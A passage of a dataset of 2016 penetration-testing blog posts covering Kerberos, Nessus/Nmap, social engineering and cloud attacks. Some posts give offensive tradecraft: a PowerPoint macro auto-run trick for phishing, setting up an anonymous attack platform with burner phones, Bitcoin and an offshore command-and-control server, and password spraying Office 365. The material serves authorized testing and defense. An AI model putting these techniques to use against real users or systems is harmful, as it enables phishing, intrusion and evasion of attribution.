        "output": "Title: \"Whats trust among schoolchildren: Kerberos Authentication Explained\"\nTaxonomies: \"InfoSec 201, 3 headed dog from gates of hell, authentication protocol, first crush, handwritten notes, Kerberos, kerberos authentication, Windows Active Directory\"\nCreation Date: \"Fri, 13 May 2016 14:37:00 +0000\"\nLogan Lembke //\nKerberos authentication can be daunting but is an important protocol to understand for any IT professional, and especially important in the field of information security. \nWhile you may not hear about Kerberos often, you probably have heard about its largest implementation: Windows Active Directory. Since Windows 2000, Kerberos has been the default network authentication protocol for users within a domain. In practice, Kerberos allows network authentication to take place without putting the user\u2019s password, or a hash of that password onto the network. In doing so, it protects users against a vast array of snooping attacks that could otherwise capture the user\u2019s credentials. \n\nThe three headed dog who guards hell,\nthere\u2019s a reason they chose the scariest mascot possible\nOne source of confusion regarding Kerberos comes from its different implementations. In the 1980\u2019s, MIT invented the Kerberos authentication protocol. By the 1990\u2019s, version 4 of the protocol became an IETF standard, and Microsoft began implementing its own version into Windows 2000. In 2005, version 5 of the MIT protocol replaced the previous IETF standard. As of now, Microsoft Kerberos currently follows version 5 of the IETF standard; however, Microsoft has made some small changes\nKerberos, as designed by MIT is an authentication protocol. However, when Microsoft implemented Kerberos, they chose to add authorization systems to the protocol as well. As you can imagine, these authorization systems have been under constant attack. Primarily, these systems have been used during post-exploitation of a domain controller in order to gain further access to network resources. \nWhile the protocol may seem overwhelming, the core concept is easy enough that  schoolchildren could take advantage of it. In fact, they do. \n\nYour first crush\nImagine you\u2019re out at recess and you see your crush and their best friend. You would really like to ask your crush to go get some ice cream with you, but you can\u2019t work up the nerve to ask. Thankfully, you\u2019ve talked to their friend before, so you wait for them to split up momentarily. That way you can talk to your mutual friend alone. Right as you begin talking to them, the bell rings and you\u2019re forced to go inside. Drats! Your friend tells you that they\u2019ll send you a note during class so you can finish your conversation.\nOnce class starts, you receive a note from your crush\u2019s mutual friend asking you what you wanted to talk about. \n\nChildhood Notes: More Secrets Passed than Symmetric Key Encryption\nYou tell them it\u2019s about your crush and that you would like them to ask your crush out for you. Rather than ask your crush for you directly, your friend comes up with a clever idea. Your friend says that they wrote a convincing letter to your crush but that you\u2019ll have to deliver the note yourself. Theres one other catch: you can\u2019t read the note. Your friend tells you that they\u2019ll ruin the whole thing on purpose if you look. You hesitate, but in the end you go along with the plan. You figure it\u2019ll work since your crush generally trusts your mutual friend.\nWhile you still need to talk to your crush, you can now casually leave the note on their desk without bringing up the topic. Better than nothing, you think.\nAfter you leave the note on their desk, you go outside and wait for their response. Suddenly, your crush comes through the door asking you about your favorite kind of ice cream. The note worked! It seems your friend successfully helped you connect!\nLets recap:\n\nYou began talking with your friend in the open.\nYour friend gave you a note so you could continue to talk with them.\nYou asked your friend to ask your crush out for you.\nRather than ask them out for you directly, they wrote a note for you.\nYou left the note for your crush.\nYour crush trusted the opinion of your mutual friend and began to read the note.\nYour crush thought about getting ice cream with you.\nYour crush decided to get ice cream with you!\n\nOn the surface, Kerberos works exactly like these love stricken schoolchildren. In this scenario, you are the user, the domain controller is your friend, and the desired service is your crush.\n\nA user asks the local domain controller to talk in the open.\nThe domain controller gives the user a key so the user can continue to talk to it.\nThe user asks the domain controller for access to a service.\nThe domain controller creates a note for the user to give to the service.\nThe user gives the service the domain controller\u2019s note.\nThe service trusts the contents of the note from the domain controller.\nThe service matches the user\u2019s information against the domain controller\u2019s note.\nThe service authenticates the user!\n\nWhile this explanation is fine for a cursory overview of the subject, further explanation is needed for a deep understanding of the topic. After searching the internet for a few hours, watching videos, and reading papers, I have found a few resources which I highly recommend.\nHow the Kerberos Version 5 Authentication Protocol Works by Microsoft TechNet\nIf you want to put your nose to the grindstone, Microsoft has laid out its version of Kerberos in a 2009 TechNet article. The article is one or two steps removed from the RFC\u2019s which specify the protocol, but it does a fine job explaining where Microsoft has altered the protocol in order to speed up operations or to provide authorization facilities. Additionally, it provides a step-by-step explanation of the authentication process.\nKerberos In the Crosshairs: Golden Tickets, Silver Tickets, MITM, and More\nSANS continues to impress with their explanation of Microsoft Kerberos. Hands down, SANS presents the best functional explanation of Microsoft\u2019s implementation of the Kerberos protocol with a specific slant towards security professionals. Beyond explaining the authentication process, the article also touches on the exploits currently available for Microsoft\u2019s Kerberos implementation (Overpass the Hash, Golden Tickets, Silver Tickets, and MITM attacks).\nAbusing Kerberos by Skip Duckwall and Benjamin Delpy Video, PDF\nDuckwall and Delpy provide an in depth look at the vulnerabilities involved with Microsoft Kerberos authentication. Mimikatz, a tool written by Benjamin Delpy for the post-exploitation of a domain controller using Kerberos, is demoed throughout the presentation. While this is a great presentation, I would recommend reading the SANS article first since the talk shows working demos of almost every exploit mentioned in the SANS post above.\nAll in all, Kerberos, while overwhelming, can be made simple by taking a step back and viewing it at a higher level. Once you understand the basics of the protocol, a large pool of knowledge will become available to you as an information technology professional. With knowledge of Kerberos, system admins can begin securing their networks, and security professionals can begin learning about the vulnerabilities inherent in the protocol.\nThere\u2019s no need to be afraid of that big, bad dog after all\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Phishing with PowerPoint\"\nTaxonomies: \"Carrie Roberts, Phishing, Red Team, autorun, penetration testing, pentest, Pentesting, phishing, social engineering\"\nCreation Date: \"Mon, 16 May 2016 14:55:44 +0000\"\nCarrie Roberts & Chevy Swanson // \n\nHow do we make sure people open up our malicious files and execute them? We simply let Microsoft work for years and years to gain people\u2019s trust, then we throw some dangerous macros into a powerpoint and people will actually have a smile on their face as they open it.\n\nThis other great blog post goes into more detail on the macros themselves and how to evade antivirus. This blog post ads a trick to get the macro to run as soon as the file is open without requiring additional user action, such as clicking or generating a mouseover event. This is a hack needed specifically for Powerpoint because it does not provide an Auto_Open or Workbook_Open option like Microsoft Word and Excel provide.\n\nThis blog post will cover how to get your macro to run as as soon as they enable macros via a nice little warning banner at the top of their screen.\n\nFirst things first, we need to open our powerpoint presentation and add the \u201cDEVELOPER\u201d Tab if it isn\u2019t already there.\n\nIn the developer tab click the \u201cVisual Basic\u201d button on the far left and that will open up a new window. Next, go to Insert>Module and here you can add in your macros. For this example we will open a message box.\n\nOr, if you just want to copy the text for yourself:\n\nSub Run_On_Open()\n\n    MsgBox \"Run_On_Open just ran\"\n\nEnd Sub\n\nOf course, if this had been an actual malicious attempt, you would have put your antivirus evading payload here instead, as shown in Sally's blog post.\n\nSave the powerpoint as a .pptm file and close it for now. Now there is the fast way and the barely slower way to do these next few steps. The fast way being the use of a program called CustomUI Editor which you can find a tutorial on how to use it for this purpose here. We can\u2019t recommend the use of any random .msi file, so instead we are going to go through the more manual option.\n\nFirst, you will want to unzip the powerpoint file into its own directory, then you will need to edit the _rels/.rels file to add this line right before the last :\n\nTarget=\u201d/customUI/customUI.xml\u201d Id=\u201dRd6e72c29d34a427e\u201d />\n\nNext, you will need to create a new directory on the same level as the _rels directory.\n\nCreate a file named customUI.xml in this new directory and add the following text:\n\nonLoad=\"Run_On_Open\" >\n\nZip your files back up. If you are on a mac, make sure you exclude the .DS_store files.\n\nzip -r newRunOnOpen.pptm . -x \"*.DS_Store\"\n\nMake sure you name it with a .pptm extension since the powerpoint must be able to load the custom ribbon we created. Your macros should now run upon opening of the powerpoint (once you enable macros).\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"The Rejected Box - An Ode to IT Professionals\"\nTaxonomies: \"Fun & Games, building a cabin in the woods, IT people are awesome, John's grunge hair, John's sister, rotting animals in a well, Thinking outside the box, throwback family posts\"\nCreation Date: \"Fri, 20 May 2016 13:22:28 +0000\"\nMelisa Wachs //\nHello IT professional.  If you haven\u2019t heard it lately, I hope you know that you\u2019re really amazing. You\u2019re probably helping \u201claymen\u201d like me all day long. Maybe you were explaining simple encryption, or sending out a phishing warning, or just updating software. Perhaps you don\u2019t feel appreciated, so today I want to give a sincere \u201cthanks.\u201d\nSee, I\u2019m not one to be able to grasp the abstract. The very idea that electricity can be harnessed, moved and stored is a mystery to me. This fascination is not just with computers. I give the same amazement to anyone who fully understands stocks, bonds, IRAs or 401ks. Where is the actual money, people?!\nWorking at BHIS, where penetration testers are the face of who we are, not the back-end in the basement, I\u2019ve noticed a common thread among you (and probably most IT professionals). You seem to have rejected simple answers, boundaries or directions. This doesn\u2019t necessarily mean you\u2019re a rebel, like John was. What I\u2019m saying is that at some point you found yourself in a box. The non-rebel may just say, \u201cfine, give me a box, but I\u2019ll define it on my own terms.\u201d Thus, perhaps you took that box, used that definition to your advantage and made yourself a rhombus, when everyone else made squares. Still a quadrilateral, but now it\u2019s your quadrilateral.\n\nThe World Wanted You to be Bob, and Bob Alone\nJohn tried to destroy the boxes handed to him, and argued with anyone who tried to close the lid on him. Mr. Sam (above) and he would have really gotten along! He definitely got this trait from our father out of pure necessity.\nAs children, our parents stumbled upon an old cabin out in the middle of nowhere. It was isolated (40 minutes from civilization), the well at times filled with rotting animals we\u2019d only find after our stomachs turned with the smell, and we had no entertainment but dirt bikes and raspberry patches. It was a dream childhood in many ways.  (I really wish the rotting animal part was a joke\u2026)\n \nThis cabin became our permanent home after an addition and remodel we did ourselves. Our father taught us how to continually bend our boxes. How, after all, do you build a home that isolated? We adapted.\nBut, for me all that physical work makes sense. I can see a ceiling doesn\u2019t need to be lowered, but a floor that needs to be raised instead. I can\u2019t see how the IT world works.\nThis is what I find amazing about you. It often seems that you work on a different world where the gravity is different and the languages are foreign. Being on calls with our team, or listening to IT conversations is intimidating. It\u2019s like I\u2019m a five-year old, in France, watching beautiful people drink good wine and laugh dismissively at me as I ask where the potty is. \nThank you for being the crazy non-box \u201cBob,\u201d but the wild quadrilateral you are!\n\nHere\u2019s one last zoom in for you to check out John\u2019s 90s grunge hair. I\u2019m not sure what he\u2019s holding, but it sure looks like a toilet seat that\u2019s rejected its own rules of conformity.\n\nOn a final note, if you catch John at a conference ask him about our dad + chainsaw = bay window. And...the squirrel.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Nessus & Nmap\"\nTaxonomies: \"Red Team, Red Team Tools, Nessus, Nmap\"\nCreation Date: \"Wed, 18 May 2016 13:46:27 +0000\"\nSally Vandeven //\nIn a recent conversation with Paul Asadoorian, he mentioned a Nessus plugin called nmapxml.  He was not sure how well it worked but suggested I try it out. The plugin allows you to import Nmap scan results for Nessus to use in the discovery phase of a scan.  The discovery phase of a Nessus scan occurs at the beginning when Nessus is trying to \u201cdiscover\u201d which hosts are alive as well as which services and operating systems are running on those hosts that will require vulnerability testing.  \nBut Nessus has a built-in port/service scanner you say, right?  Yes, you are absolutely correct but since Nmap specializes in port scanning and service/OS fingerprinting maybe it would do an even better job than its Nessus cousin!  Well, I am an unashamed Nmap fan girl for sure so I was convinced that adding Nmap to the mix would dramatically improve the accuracy of our Nessus findings and hopefully reduce some false positives.  With that in mind, I decided to take this plugin for test drive and this is what I found\u2026.\n\n\u2026.Importing Nmap scanning results provides NO improvement in fingerprinting or service discovery.  You can actually stop reading here if you want.  But if you are curious about how this process went -- read on.  And by all means, if you have experimented with this plugin and have had better results please drop me a note and tell me about it.  \nThe process went something like this:\nStep 1: Grab the NASL file from http://static.tenable.com/documentation/nmapxml.nasl\nStep 2: Place the NASL file in the plugins folder of your Nessus installation\n$ cp nmapxml.nasl  /opt/nessus/lib/nessus/plugins/\nStep 3: Stop the Nessus service\n$ sudo /etc/init.d/nessusd stop  \nStep 4: Install the new plugin\n$ cd /opt/nessus/sbin\n$ sudo ./nessusd -y      (to install the new plugin)\nStep 5: Restart the Nessus service\n$ sudo /etc/init.d/nessusd start\nStep 6: Run an Nmap scan of your target network\n$ nmap -A -oX nmap-output.xml \u2013iL targets.txt\n        -A means include OS and version detection and allow NSE script scanning and traceroute\n        -oX means write the output file in XML format\n        -iL  means take the list of targets to scan from the file targets.txt with the format:\n        10.11.12.13\n        10.11.12.14\n        172.16.24.0/24\n        192.168.100-125\nStep 7: Configure Nessus to use your Nmap results in the Discovery phase:\n\nStep 8:  Run your Nessus scan using the newly updated policy that includes the Nmap scan results.\nThat\u2019s really all there is to it.  After comparing the results with and without the Nmap file, the results were basically identical.  After three scan attempts and some tweaking of the Nmap scanning options, the only differences I found were very minor and probably due to other network congestion. The differences did not significantly impact the fingerprinting or service detection.  \nSo why even bother writing about such unexciting results?  For two reasons.  First, because just in case this sounded promising to you and you had also put it on your TO DO list \u2013 I thought I would save you the time.  And second, because this is what we do so much of the time\u2026.try something only to find that it does not work the way we had hypothesized.  But the good news is that we learn things in the process, which is exactly why I love this work!!\nI plan to experiment with this some more (for example, IPv6 fingerprinting) and if I learn anything interesting I\u2019ll be sure to post it here.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"You Down With APP? (Yeah You Know Me)\"\nTaxonomies: \"Author, Derek Banks, General InfoSec Tips & Tricks, InfoSec 201, anonymous, Any job that involves a burner phone is a great job, cash, hacking, nuke it all afterwards, red teaming, white hat hacking\"\nCreation Date: \"Wed, 25 May 2016 15:00:00 +0000\"\nDerek Banks //\n\nYes, I date myself with reference in the title of this blog post.  I can be lame like that.\n\nA fair amount of my time at $last_gig was spent analyzing the Tools Techniques and Procedures of the Advanced Persistent Threat.  Now, as a pentester, I have often thought about applying some of those techniques.  What if I had to create a burnable and unattributable attack platform for a specific type of engagement?  How would I go about it and be an Advanced Persistent Pentester?\n\nThis interest was renewed by my co-worker Beau Bullock\u2019s talk at B-Sides Orlando on \u201cFade from WhiteHat to Black?\u201d and also by a client that wanted us to do a black box assessment as if we were actual attackers trying not to get caught.\n\nNow obviously this isn\u2019t going to be the in the same league as a nation state with deep financial pockets.  It probably isn\u2019t even the same game.  But it is an interesting exercise nonetheless, and for those #redteam times when you want decrease your potential digital footprint, this may help give you some ideas.\n\nWhere possible, I am not going to repeat instructions that can be found elsewhere online such as how to make a bootable USB drive.  Afterall, that\u2019s what the Internet is for, right?\n\nAlso the obligatory warning that this configuration should not be used for attempting to hack systems that you are not authorized to.  Nothing is unattributable and untrackable, it can just be made less so.  If you perform illegal activities, it is my belief that maintaining perfect OpSec is incredibly difficult and you will get caught if the full weight of law enforcement comes after you.  So don\u2019t do stupid stuff that will get you into trouble.\n\nWhat we will need:\n\nCash (for buying all the stuff we need and mostly not getting tracked).\n\nLaptop and USB flash drive (for loading the OS).\n\nPrepaid phone (needed for registering email addresses or other accounts).\n\nPrepaid VISA cards for converting to Bitcoin (BTC).\n\nVirtual Private Server that takes Bitcoin (VPS).\n\nCash\n\nHow much?  That depends.  I already owned a Lenovo t420 and opted to use it, but found almost the same system (without SSD drives) for $250 on Craigslist.  With the laptop my total cost would have been $423.69.\n\nSmartphone\n\nObtain a burner phone.  Note that 7-11 never seems to have them in stock (I went to three before giving up and going to Walmart).  The cost for a Tracfone Alcatel OnePlus was $63.79 with a 120 minute plan card (there was a special that tripled the minutes).\n\nIt seemed that the activation required WiFi to configure Android, but it may work to activate at Tracfone.com prior to setting up the phone so the 4G connection is set up.  If connecting to WiFi, consider connecting to a public network.  Obviously this was my first Tracfone.\n\nMainly this will be used for SMS messages for account verification, but hey, having a burner phone should come in handy\u2026 maybe for Defcon I guess?  Note that the email address that I created with Google during setup will not be used other than for the phone registration.  There are a few reasons for that.\n\nLaptop Setup\n\nThis section isn\u2019t meant to be how to create a perfectly secure and anonymous laptop for long term use.  There are other resources for that - I\u2019ve been reading How to Setup a High-Security Laptop for Hacking*, Privacy, Self-Protection and Deep Web Voyaging:Using Kali Linux 2.0 + VirtualBox + Whonix + Obfuscated Bridges + Tor: Dark Net Science Book 1 which has been interesting, but we\u2019re not going that far in this post.\n\nOur OS will be burned after the engagement due to the Ripley Doctrine (Take off and nuke the entire site from orbit.  It\u2019s the only way to be sure).  Any data that will need to be kept after the engagement will need to be consolidated from local and and archived in some manner.  Afterall, if I were an actual attacker, I\u2019d attempt to stand up new infrastructure for every campaign and burn it when it was over.\n\nPurchase a laptop off of craigslist.  I found a close configuration to the Lenovo t420 that I already own for $250.  Keep it cheap, we\u2019re running Linux and you want it to be a few years old, it will work better.  I chose Ubuntu 14.04 LTS as the OS because I know it works very well with the Lenovo t420.\n\nI know, I know... Ubuntu 14.04 comes out of the box with some privacy concerns.  We\u2019re going to makes some changes to that.  I realize the choice of Ubuntu may make some folks say that or that other distro is a much better choice for what you\u2019re doing here.  That may be the case, our industry is full of caveats that make people stay up late at bars at conferences arguing the pros and cons and starting flame wars on the Internet.  I like Ubuntu because it tends to work better for me.\n\nDownload the ISO, verify the checksum, and make a bootable install drive out of the USB stick.  Instructions are easily found online for any platform, so I will not repeat them.\n\nDuring the installation process, select to encrypt the installation.  Choose as long as a security key as you as you can remember.\n\nContinue with the default installation.  When it is time to select the computer host name and username, select what you feel is appropriate, but I would suggest your normal names or handles are not what you want here.   Use something generic and inconspicuous.\n\nOnce booted into the new installation, update it:\n\n#apt-get update\n\n#apt-get upgrade\n\n#apt-get install git\n\nNext we will set up some pentesting tools.  Use git to clone TrustedSec\u2019s PTF project.\n\n#git clone https://github.com/trustedsec/ptf.git\n\nChange into ptf/ and run PTF.\n\n#cd ptf/\n\n#./ptf\n\nOnce in the framework:\n\nptf>use modules/install_update_all\n\nThis takes a while, but when complete, will have current pentesting tools in /pentest.\n\nWhile PTF does it\u2019s thing, follow the instructions at https://fixubuntu.com/ to turn off search suggestions that may send data to a third party.\n\nPTF is still installing, so I suggest going to get a password manager to generate and keep long passwords.  I like Keypass but as long as the key store is kept local, it should be ok.  As you need to create passwords for various resources, generate long random passwords.\n\nIf PTF is still installing, go get some coffee, check back on it in a bit.  It will need you to answer some questions, take the defaults.  Take this time to change the DNS server entry in resolv.conf to point to Google\u2019s DNS (or any DNS server that is not your ISP).\n\nNext, install Virtual Box.  Download and create VMs for Kali and Tails.  Install Tor Browser on the native Ubuntu install.   Most work will happen in the VMS, but I like the flexibility of having tools natively available as well.\n\nLastly, go get Burp Suite.  The free version may work for you if just to proxy your web traffic when necessary.  The full version is totally worth it, but would add $350 to the cost and I am pretty sure they do not take Bitcoin.  Zed attack proxy may work for your purposes as well.\n\nNext, register a Yahoo email account.  Why?  Because using a mail client with Yahoo (not the web interface) will let you send malicious payloads through it in case you need to send targeted phishing messages and are able to make your ruse work with the Yahoo address.\n\nThis should provide a solid and flexible platform for a laptop as a base attack platform to get started with.\n\nVirtual Private Server Setup\n\nNow we need a VPS on the Internet for our testing platform.  We will use it to VPN through as well as hosting listeners for command and control.  But first, we need a way to pay for it that is somewhat more anonymous than a credit card or Paypal.  How about Bitcoin?  I would never say that I am a cryptocurrency expert by any stretch of the imagination, but it seemed that BTC wasn\u2019t necessarily intended to be anonymous.  But it seems more so than other payment options for sure.\n\nThere were two ways that some Googling provided to obtain Bitcoins anonymously:\n\nLocally, meeting someone and giving them cash\n\nPrepaid VISA Card\n\nLocal Bitcoin traders seemed to have a 1BTC minimum, at the time of this writing that was ~$450, much more that we need for a month or two a VPS and past my comfort zone for an experiment.\n\nI picked up two $50 Vanilla branded cards at a local drugstore about a mile from my house.  Not exactly \u201canonymous\u201d since I also went to my bank\u2019s ATM right next door to pull out the cash.  I was most certainly on video at the ATM and in the drugstore.  But it was unattributable enough for the test.\n\nNot every BTC market place accepted prepaid VISA cards as a payment method.  After some research, paxful.com provides the means to do so with a few brands of cards.\n\nAfter creating an account, choose the brand of gift card that you have.  Mine was listed prominently on the page.\n\nYou will be purchasing BTC from another individual through the paxful market.  The cost of BTC in this method will be approximately $.77 on the dollar and it fluctuations a few cents.  The two transactions for this test required pictures of the front and back of the card.  If these were taken with a smartphone, as mine were, do not forget to remove the exif data.\n\n#exiftool -all= *.jpg\n\nOnce enough BTC has been obtained for the duration of the operation, then it is time to set up the VPS.  LibertyVPS (https://libertyvps.net/) allows OpenVPN in their terms of service and is hosted in the Netherlands.  Create an account and order the cheapest server.\n\nWhen checking out, select the Bitcoin option.  When you initiate the transaction, since your BTC wallet is not on the local system, but on paxful.com, transfer the amount to LiberyVPS from the paxful.com wallet.  The checkout window on LiberyVPS will hang, but the transaction will complete.\n\nSSH should be live on the VPS after creation.  Once connected we will do the same as with the laptop - update the server and install git and PTF.  Why install the same tools on the client and the server?  Well, there are a lot of tools there.  Better to set up what you may need now than get into the middle of something later and realize you should have installed it.\n\nOpenVPN\n\nI followed the instructions from:\n\nhttps://www.digitalocean.com/community/tutorials/how-to-set-up-an-openvpn-server-on-ubuntu-14-04\n\nThe only deviation was that a dependency package needed to be forced:\n\n#apt-get install openvpn easy-rsa\n\n#apt-get install -f\n\n#apt-get install openvpn easy-rsa\n\nOnce openvpn server is up and running and the client files have been configured use the openvpn client built into Linux to connect.\n\n#openvpn --config myvpn.ovpn\n\nNow we have a laptop setup that would be a bit more anonymous for reconnaissance activities with Tor browser and Tails when necessary and and to VPN in our VPS as the main attack platform.  When VPNed into the system, using Burp Suite for web app testing fromt the laptop, the traffic should appear to come from the offshore VPS.\n\nAfter connecting the VPN to the VPS, Google thought I was in a different area of the world.\n\nAs a quick test I ran an nmap scan on an externally facing host and using tcpdump to write the network traffic to file.   I admit it was not a comprehensive test to see if any data was leaking out, but for pentesting and red team purposes, this should be sufficiently anonymous to raise the bar if you need to do so.\n\nNon VPN connection scanning from native laptop install:\n\nVPN connection scanning from native laptop install:\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Storm Chasing: How We Hacked Your Cloud\"\nTaxonomies: \"Author, Beau Bullock, External/Internal, Red Team, cloud, Cloud computing, hack a cloud, hacking clouds, Pentesting, storm chasing\"\nCreation Date: \"Thu, 26 May 2016 15:34:35 +0000\"\nBeau Bullock //\n\nOverview\nThe traditional methodology of a remote attacker who has no preconceptions of a target network used to be fairly static. With organizations moving to \"the cloud\", the approach attackers are taking is going to change drastically if it hasn't already. In this blog post I am going to detail why, if your organization has moved its assets to the cloud, an attacker is likely going to make that their primary attack focus. They will likely succeed, and you will likely not know that it happened.\nCloud Computing Primer\nScalable storage, easy collaboration between employees, and cost savings by eliminating the need for a data center are all benefits that organizations see in \u201cthe cloud\u201d. From a security perspective there are definitely some added benefits of cloud computing, but I am going to discuss a few shortfallings. One very common misconception is that \u201cthe cloud\u201d is some mystical flying entity that protects your data, saves you valuable hard drive space, and shades you from the sun.\n\nThis is the definition of \u2018cloud computing\u2019:\nCloud Computing: n. the practice of using a network of remote servers hosted on the Internet to store, manage, and process data, rather than a local server or a personal computer.\nThis essentially means that your data that previously would have been on your own system is just on someone else's system now, and you are renting space from them. There are many considerations that must come to mind when you look at handing your data over to a cloud provider.\n\nIs the cloud provider doing their own due diligence when it comes to network security? Many people see the likes of Google, Microsoft, and Amazon and immediately believe that because these services are so popular and widespread that they must be secure. If one of these organizations had a breach it would be bad for a lot of people.\nIs the data physically secure? Your data is physically sitting on a hard drive somewhere inside one of the data centers of the cloud provider you choose. What are they doing to protect physical access to those?\nOne concern I\u2019m not going to get into in this post but is definitely one many have is this: Are the cloud providers themselves being ethical when it comes to the handling of your data? Are they able to access whatever they want of yours? If so, would you know if they do? ...And what about if a government entity requests data from them?\n\nSure, cloud computing is convenient. But sacrificing security for convenience is a fatal mistake.\nExternal Network Pentest Forecast\n\nWhen it comes to an external network architecture most organizations think that there are only two possible attack vectors for an attacker to gain access to internal resources. Most think that an attacker must either find a remotely exploitable flaw in an externally exposed system, or they must phish an employee of the organization.\nOf course there are a multitude of other ways an attacker might gain access to an organization's internal network but these typically involve some sort of physical access. For example, many organizations offer wireless networks and occasionally do a poor job at segmenting guest networks from corporate networks. There is also the risk of a malicious insider who already has physical access to an internal asset of an organization. With organizations moving more and more of their internal data systems, assets, and communication architecture to the cloud this adds a new attack vector for remote attackers.\nIn two other blog posts I\u2019ve written I detailed ways an external attacker can gain access to domain credentials without being on a target network. In part 1 I discussed how employees are reusing the same passwords on personal accounts as corporate accounts and how attackers can find these. In part 2 I discuss password spraying Outlook Web Access portals.\nBoth of these techniques can result in an attacker gaining access to domain credentials, but an attacker who wants to compromise an organization\u2019s assets would still need access of some kind to a target network. This would historically mean the attacker would still need to find some sort of VPN access, or phish an internal employee. With more movement of corporate assets to cloud infrastructures it is becoming more likely that an attacker simply needs a valid credential and a web browser to access sensitive corporate data.\nCase Study: Let\u2019s Go Hack A Cloud\nVery recently a coworker of mine Derek Banks (0xderuke) and myself were performing a \u201cBlackbox External Network Assessment\u201d. The blackbox nature of this assessment means that we had no scoping information. No target ranges were provided to us so we were on our own to perform recon and discover where this company's external assets were. Through our recon we found a few external hosts, but the attack surface was very slim.\nThrough bruteforcing of subdomains we discovered an \u2018autodiscover\u2019 subdomain. The \u2018autodiscover\u2019 subdomain is commonly used to assist in the setup of email clients so that the user simply needs to enter an email address and password. This is very commonly associated with Microsoft Exchange environments. For this particular customer, when we navigated a web browser to the autodiscover subdomain we were redirected a Microsoft Office 365 login portal. At this point we contacted the customer to determine if the Microsoft Office 365 portal was in scope for testing. They confirmed that it was. (Note: when pentesting third-party services of any kind it is very important that the organization communicate that an assessment is going to occur with the third-party. Most third-party orgs have a pentest authorization form the organization can fill out to authorize the pentest. See below for a list of these.)\nDuring our reconnaissance phase we always try to find both valid email addresses as well as usernames. For this particular company we had discovered a relatively low number of valid email addresses, and no usernames. Nevertheless we proceeded in attempting password-spraying attacks. Even with the low number of email addresses we had discovered we were still able to password spray a valid user credential using the always-reliable, season-year combination (Spring2016).\nHere\u2019s where the magic comes into play when it comes to attacking cloud infrastructures. We started with a very small number of valid email addresses, and then password sprayed one. This organization did not utilize two-factor authentication so at this point we had access to this particular user\u2019s Office 365 account, which had access to Outlook mail, Sharepoint, OneDrive, etc. Before we proceeded in pillaging the Office365 services we wanted to see if we could find any more valid email addresses. So, naturally we started poking around Outlook. The thing we quickly learned was that the \u201cAddress Book\u201d gave us pretty much everything we needed. It included the email addresses, usernames, phone numbers, and full names of every employee in the company. At this point we now had a complete list of everyone\u2019s email address in thecompany.\n\nOutlook Address Book\nWe continued on with more password spraying, this time with a full email list. Many more credentials were obtained and we now had access to the cloud infrastructure as a number of different types of users with different roles in the company. For each user the types of files and things we could access in the cloud were different. But just like a file share on an internal network, the permissions must be configured so that only the correct users are able to access protected resources.\nAnytime there is a collaboration/documentation platform like Sharepoint used by an organization there is commonly a treasure-trove of data to be found there. We found a ton of very sensitive information being stored in this organization\u2019s cloud. While we navigated through the Sharepoint site and located sensitive company information we more importantly found access to the organization\u2019s actual internal infrastructure.\n\nSharepoint, like pretty much every other cloud service, has a very useful \u2018search\u2019 function. This is useful to employees to find the documents they are looking for fast but is also useful to an attacker if the organization is storing sensitive documents there. During our reconnaissance phase we didn\u2019t discover any sort of remote access systems like a VPN server. This was very much intriguing to us as we assumed that this rather large organization had users accessing their network remotely. We performed a search in their Sharepoint site for \u201cVPN\u201d. Low and behold we found a document detailing exactly what VPN client to install, where to direct it to connect to, and the \u201cPIN\u201d that must be used along with valid user credentials to authenticate to the organization\u2019s network.\nOf course two-factor wasn\u2019t enabled on the VPN as well. We VPN\u2019d into the network as one of the users we password sprayed. From there we escalated privileges to domain admin through our typical means.\nConclusion\nWhile this story ended up with us accessing an organization's internal network infrastructure during a blackbox external network assessment, we did it by hacking our way through the organization\u2019s cloud infrastructure. This particular assessment was focused on attacking the Microsoft Office 365 platform, but could easily be performed against similar cloud infrastures like Google, or Amazon\u2019s AWS.\nIf you are an organization that utilizes cloud services to host your organization's data, email, etc. please implement two-factor authentication. Had two-factor authentication been enabled during the case study above we would have been stopped way earlier.\nRemember that if you are going to perform a pentest against a third-party service get authorization first. I\u2019ve crafted a list of a few of the auth forms below.\nPentest Authorization Forms\nMicrosoft Azure - https://security-forms.azure.com/penetration-testing/terms\nAmazon AWS - https://aws.amazon.com/security/penetration-testing/\nGoogle Cloud Platform - https://cloud.google.com/security/\n        -Interestingly enough Google says you don\u2019t have to contact them.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"The Easiest Con - Hacking the Human & 9 Tips to Avoid Social Engineering\"\nTaxonomies: \"General InfoSec Tips & Tricks, InfoSec 101, be careful whom you trust, con artistry, crying babies, pen-testing, penetration testing, people are kind, people are naive, phishing, scamming, social engineering, trust\"\nCreation Date: \"Tue, 31 May 2016 16:37:47 +0000\"\nHeather Doerges //\n\nOf all the services we offer at BHIS, Social Engineering is the most interesting to me. It\u2019s something (and quite possibly the only thing) I completely understand and feel I am fully capable of doing. I also know that it\u2019s one of the more difficult and uncomfortable things our testers do. This is a good thing, to me it means we are employing honest, good people who hate lying in order to succeed. However, they manage and are good at it.\n\nSo, what exactly is social engineering? \n\nIt refers to psychological manipulation to get people to do things and give away sensitive information to gain access to a network or computer system. It\u2019s usually just a portion of a larger con/attack on an individual or company.  It is much like phishing, which attempts to get sensitive information such as usernames, passwords, and credit card details by masquerading as a trustworthy entity in an electronic communication. But while phishing might be another part of the overall attack, social engineering also includes hacking for information via phone, or even sometimes in person.  Social engineering is used to execute hacking techniques and phishing scams by exploiting our inherent helpfulness, kindness, naivety, and gullibility.  We\u2019re so sneaky.\n\nHow does it work? \n\nOne of the more memorable examples of social engineering I\u2019ve seen is this: \n\nhttps://youtu.be/lc7scxvKQOo\n\nIn this video, a hacker plays the sound of a baby crying and then calls a cell phone company in order to gain access to a total stranger\u2019s account. Because she pretends to be the stranger\u2019s newly married wife, has a crying baby, and acts fairly upset, the cell phone company not only gives her access to the email on the account but also allows her to change the guy\u2019s password, so now, he can\u2019t even gain access to his account. With that information, she can now go into his account online and see all his personal account information. Let\u2019s face it, a lot of us keep some very personal information on our phones. She had access to his pictures, account info, location and more, probably long before he even realizes she has it.\n\nPenetration testers employ these methods, without the malicious intent, to show a company how devastating these attacks can be. Our testers are hired by those companies to test how difficult it would be to gain access to their organization or personnel via social engineering. \n\nSo, just how hard is it to be resistant to these sorts of attacks? There are literally thousands of variations to social engineering attacks.\n\nHere are some ways to prevent falling victim to social engineering: 